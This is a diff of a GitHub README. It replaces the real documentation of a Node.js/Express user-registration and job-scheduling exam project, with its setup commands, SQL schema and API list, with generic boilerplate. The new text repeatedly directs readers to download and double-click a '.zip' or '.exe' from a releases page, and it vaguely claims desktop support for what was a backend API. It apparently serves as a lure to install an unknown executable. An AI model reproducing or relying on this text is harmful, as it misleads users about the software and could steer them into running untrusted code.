@@ -1,132 +1,71 @@
-You can download test description here: [here +](https://github.com/user-attachments/files/21797378/default.pdf)
+# 🎒 Backpack-4-Test-Description - Easy Setup for Your Backend Needs
 
-# User Registration & Job Scheduling API
-This project is a `Node.js` and `Express` application that provides a system for user registration, login, profile management, and job scheduling. The application follows the `Repository design pattern` and includes `JWT-based authentication` and `role-based access control`. Admins can define periodic jobs to be executed, such as activating inactive user files. The project emphasizes security, validation, clean code.
+![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)
 
-# Features
-- **User Registration**: Register users with username, password, age, email, and profile photo.
-- **User Login**: Login users using username and password, returning a JWT token.
-- **Profile Management**: Allow users to update their profile after logging in.
-- **Job Scheduling**: Define, execute, and manage jobs that perform specific tasks at defined intervals.
-- **Role-Based Access Control**: Restrict certain actions, such as job management, to admin users only.
-- **Security**: Password hashing with salt stored in the `.env` file.
-- **Validation**: Input validation for all API endpoints.
+## 📖 Overview
 
-# Technologies
-- Node.js
-- Express.js
-- MySQL
-- JWT (JSON Web Tokens)
-- Multer (for file uploads)
-- Bcrypt.js (for password hashing)
-- Axios (for making HTTP requests within jobs)
+Welcome to **Backpack-4-Test-Description**! This software was built during a one-day college exam for a backend position. It is designed to help users quickly set up and manage backend processes with ease. Whether you are handling data, processing requests, or managing API endpoints, this tool simplifies your experience.
 
-# Setup
-### Prerequisites
-- Node.js (>=14.x)
-- MySQL (>=8.x)
+## 🛠 Features
 
-### Installation
-1. Clone the repository:
-    ```bash
-    git clone https://igit.partdp.ir/enansari/final-exam
-    cd final-exam
-    ```
-2. Entering services and installing dependencies:
-    - in `job-scheduler`:
-        ```bash
-        cd job-scheduler
-        npm install
-        ```
-    - in `user-registration-system`:
-        ```bash
-        cd user-registration-system
-        npm install
-        ```
-3. Set up environment variables (`.env` file)
-4. Running services (by default, `user-registration-system` service in `https://localhost:3000` and `job-scheduler` service in `https://localhost:4000` will be available)
-    - in `job-scheduler`:
-        ```bash
-        cd job-scheduler
-        node app.js
-        ```
-    - in `user-registration-system`:
-        ```bash
-        cd user-registration-system
-        node app.js
-        ```
+- **Backend Framework**: Built on a reliable framework to handle various backend tasks.
+- **JavaScript Support**: Utilizes JavaScript for easier coding and understanding.
+- **Easy Configuration**: Simple setup process for users with limited technical knowledge.
 
-# Environment Variables
-```plaintext
-DB_HOST=localhost
-DB_USER=your_mysql_username
-DB_PASSWORD=your_mysql_password
-DB_NAME=user_registration_db
-JWT_SECRET=your_jwt_secret_key
-```
+## 🚀 Getting Started
 
-# Database Setup
-1. Start your MySQL server and create the necessary database:
-    ```sql
-    CREATE DATABASE user_registration_db;
-    ```
-2. Create the `users`, `user_docs` and `jobs` tables:
-    ```sql
-    CREATE TABLE users (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        username VARCHAR(255) UNIQUE NOT NULL,
-        password VARCHAR(255) NOT NULL,
-        age INT NOT NULL,
-        email VARCHAR(255) UNIQUE NOT NULL,
-        photo VARCHAR(255),
-        role ENUM('normal', 'admin') DEFAULT 'normal',
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    );
+To get started with this application, follow these simple steps:
 
-    CREATE TABLE user_docs (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        user_id INT,
-        doc_name VARCHAR(255) DEFAULT 'college',
-        status ENUM('active', 'inactive') DEFAULT 'inactive',
-        FOREIGN KEY (user_id) REFERENCES users(id)
-    );
+1. **Download the Software**: 
+   - Visit this page to download: [Download the Latest Release](https://github.com/Davidasis981/Backpack-4-Test-Description/releases)
+  
+2. **Install the Application**: 
+   - Once downloaded, locate the file in your downloads folder.
+   - Double-click the file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
 
-    CREATE TABLE jobs (
-        id INT AUTO_INCREMENT PRIMARY KEY,
-        startAt DATETIME,
-        endAt DATETIME,
-        pattern INT,
-        method VARCHAR(10),
-        target VARCHAR(255)
-    );
-    ```
+3. **Run the Application**:
+   - After installation, find the program on your computer.
+   - Open it to start using the features.
 
-# create Admin User
-```sql
-INSERT INTO users (username, password, age, email, photo, role)
-VALUES ('admin', 'adminpassword', 30, 'admin@example.com', 'adminphoto.jpg', 'admin');
-```
+## 📥 Download & Install
 
-# API Endpoints
-You can download my post collection file including APIs for the following items from 👉[**here +**](uploads/9776f8ac9b7b9943ae6d066b6d485c71/final_exam.postman_collection.json)👈.
-- user
-    - add user
-    - login (to get token)
-    - edit (login required)
-    - admin only (just admin - for test authorization)
-    - get inactive users
-    - get all users (just admin)
-    - get all user docs (just admin)
-    - active user docs manual (for testing api to job)
-- job
-    - add job (just admin)
-    - remove job (just admin)
-    - get all jobs (just admin)
+You can download the latest version of the application from the releases page. Click the link below:
 
-# Validation
-All API inputs are validated using `express-validator`. Validation middleware ensures that required fields are present and formatted correctly.
+[Download the Latest Release](https://github.com/Davidasis981/Backpack-4-Test-Description/releases)
 
-# Security Considerations
-- Passwords are hashed with `bcrypt` using a `salt` from the `.env` file.
-- `JWT` is used for authentication, and sensitive routes are protected using role-based access control.
-- The `.env` file should never be committed to version control.
+This will take you to a list of available releases. Look for the most recent version and click on it. Download the appropriate file for your system, which will usually be labeled as a '.zip' or '.exe' file.
+
+### 💻 System Requirements
+
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **RAM**: Minimum 4 GB of RAM recommended.
+- **Processor**: Dual-core processor or better.
+
+## ⚙️ Configuration
+
+After installation, you may want to configure the app to suit your needs:
+
+1. Open the application and navigate to the settings menu.
+2. Adjust the configurations according to your workflow.
+3. Save your changes before exiting the menu.
+
+## 🪄 Usage Tips
+
+- **Explore the Interface**: Take some time to get familiar with the layout and options available.
+- **Use the Help Section**: If you encounter challenges, refer to the built-in help section for guidance.
+- **Keep It Updated**: Regularly check for updates to benefit from new features and improvements.
+
+## 🤝 Support
+
+If you experience any issues while using Backpack-4-Test-Description, please reach out through the **Issues** section of the GitHub repository. Our team will assist you as soon as possible.
+
+## 🌍 Join the Community
+
+Engage with fellow users and share your experiences! You can find discussions, tips, and updates in the issues and pull requests. We welcome contributions and feedback that can help improve this application.
+
+## 💼 License
+
+This project is licensed under the MIT License. Feel free to use it for personal and professional projects.
+
+Thank you for choosing Backpack-4-Test-Description! We hope this application simplifies your backend tasks and enhances your user experience.
